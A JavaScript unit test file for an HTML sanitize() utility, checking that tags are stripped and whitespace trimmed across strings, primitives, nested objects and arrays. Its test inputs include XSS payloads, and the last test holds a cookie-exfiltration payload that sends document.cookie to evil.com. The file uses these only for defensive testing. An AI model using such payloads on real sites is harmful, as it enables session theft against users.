/**
 * Test: services/utilities.sanitize()
 * Unit tests for HTML sanitization and trimming across all data types
 *
 * Run: npx omega test helpers/sanitize
 *
 * Covers:
 * - Pure schema fields (sanitized by default, opt-out with sanitize: false)
 * - All non-schema fields (no schema, sanitize everything)
 * - Combo: schema + non-schema fields together
 */
const Utilities = require('../../dist/omega/services/utilities.js');
const defineCases = require('../../dist/vendor/devkit/test/define-cases.js');

// Mock omega
const omega = { firebase: {} };
const utilities = new Utilities(omega);

module.exports = defineCases({
  description: 'Utilities.sanitize()',
  type: 'group',

  tests: [
    // ─── Strings ───

    {
      name: 'strips-script-tags',
      async run({ expect }) {
        const result = utilities.sanitize('<script>alert("xss")</script>hello');
        expect(result, 'Should strip script tags').toBe('hello');
      },
    },

    {
      name: 'strips-img-onerror',
      async run({ expect }) {
        const result = utilities.sanitize('<img src=x onerror="alert(1)">text');
        expect(result, 'Should strip img with onerror').toBe('text');
      },
    },

    {
      name: 'strips-nested-html-keeps-text',
      async run({ expect }) {
        const result = utilities.sanitize('<div><b>bold</b> and <i>italic</i></div>');
        expect(result, 'Should strip all tags but keep text').toBe('bold and italic');
      },
    },

    {
      name: 'trims-whitespace',
      async run({ expect }) {
        const result = utilities.sanitize('  hello world  ');
        expect(result, 'Should trim').toBe('hello world');
      },
    },

    {
      name: 'strips-and-trims-together',
      async run({ expect }) {
        const result = utilities.sanitize('  <b>hello</b>  ');
        expect(result, 'Should strip tags and trim').toBe('hello');
      },
    },

    {
      name: 'clean-string-unchanged',
      async run({ expect }) {
        const result = utilities.sanitize('just plain text');
        expect(result, 'Clean string should pass through').toBe('just plain text');
      },
    },

    {
      name: 'empty-string-unchanged',
      async run({ expect }) {
        const result = utilities.sanitize('');
        expect(result, 'Empty string should remain empty').toBe('');
      },
    },

    // ─── Primitives ───

    {
      name: 'null-returns-null',
      async run({ expect }) {
        expect(utilities.sanitize(null), 'null should pass through').toBe(null);
      },
    },

    {
      name: 'undefined-returns-undefined',
      async run({ expect }) {
        expect(utilities.sanitize(undefined), 'undefined should pass through').toBe(undefined);
      },
    },

    {
      name: 'number-passes-through',
      async run({ expect }) {
        expect(utilities.sanitize(42), 'Numbers should pass through').toBe(42);
      },
    },

    {
      name: 'boolean-passes-through',
      async run({ expect }) {
        expect(utilities.sanitize(true), 'Booleans should pass through').toBe(true);
      },
    },

    // ─── Non-schema objects (sanitize everything) ───

    {
      name: 'flat-object-sanitizes-all-strings',
      async run({ expect }) {
        const result = utilities.sanitize({
          name: '<b>Evil Corp</b>',
          count: 5,
          active: true,
        });
        expect(result.name, 'Should strip HTML from name').toBe('Evil Corp');
        expect(result.count, 'Number should pass through').toBe(5);
        expect(result.active, 'Boolean should pass through').toBe(true);
      },
    },

    {
      name: 'deeply-nested-object-sanitizes',
      async run({ expect }) {
        const result = utilities.sanitize({
          settings: {
            brand: {
              name: '<script>xss</script>Acme',
              about: '<img src=x onerror=alert(1)>We sell stuff',
            },
            enabled: true,
          },
        });
        expect(result.settings.brand.name, 'Should strip deep nested script').toBe('Acme');
        expect(result.settings.brand.about, 'Should strip deep nested img').toBe('We sell stuff');
        expect(result.settings.enabled, 'Deep boolean should pass through').toBe(true);
      },
    },

    // ─── Arrays ───

    {
      name: 'array-sanitizes-each-string',
      async run({ expect }) {
        const result = utilities.sanitize(['<b>one</b>', 'two', '<script>x</script>three']);
        expect(result[0], 'First element stripped').toBe('one');
        expect(result[1], 'Clean element unchanged').toBe('two');
        expect(result[2], 'Third element stripped').toBe('three');
      },
    },

    {
      name: 'array-of-objects',
      async run({ expect }) {
        const result = utilities.sanitize([
          { name: '<b>Alice</b>' },
          { name: '<i>Bob</i>' },
        ]);
        expect(result[0].name, 'First object name stripped').toBe('Alice');
        expect(result[1].name, 'Second object name stripped').toBe('Bob');
      },
    },

    {
      name: 'mixed-array-types',
      async run({ expect }) {
        const result = utilities.sanitize(['<b>text</b>', 42, null, true]);
        expect(result[0], 'String stripped').toBe('text');
        expect(result[1], 'Number passed through').toBe(42);
        expect(result[2], 'null passed through').toBe(null);
        expect(result[3], 'Boolean passed through').toBe(true);
      },
    },

    // ─── XSS attack vectors ───

    {
      name: 'xss-event-handler',
      async run({ expect }) {
        expect(utilities.sanitize('<div onmouseover="alert(1)">hover me</div>')).toBe('hover me');
      },
    },

    {
      name: 'xss-iframe',
      async run({ expect }) {
        expect(utilities.sanitize('<iframe src="evil.com"></iframe>safe')).toBe('safe');
      },
    },

    {
      name: 'xss-svg-onload',
      async run({ expect }) {
        const result = utilities.sanitize('<svg onload="alert(1)">test</svg>');
        expect(result.includes('onload'), 'Should not contain onload').toBe(false);
      },
    },

    {
      name: 'xss-full-agent-creation-payload',
      async run({ expect }) {
        const result = utilities.sanitize({
          name: '<img src=x onerror="fetch(\'https://evil.com?c=\'+document.cookie)">Agent',
          welcomeMessage: 'Hello <script>document.location="https://evil.com"</script>',
          brand: {
            name: '"><script>alert("xss")</script>',
            about: '<iframe src="https://evil.com"></iframe>About us',
          },
        });
        expect(result.name, 'name should be clean').toBe('Agent');
        expect(result.welcomeMessage.includes('<script>'), 'welcomeMessage should not have script').toBe(false);
        expect(result.brand.name.includes('<script>'), 'brand.name should not have script').toBe(false);
        expect(result.brand.about, 'brand.about should be clean').toBe('About us');
      },
    },
  ],
});
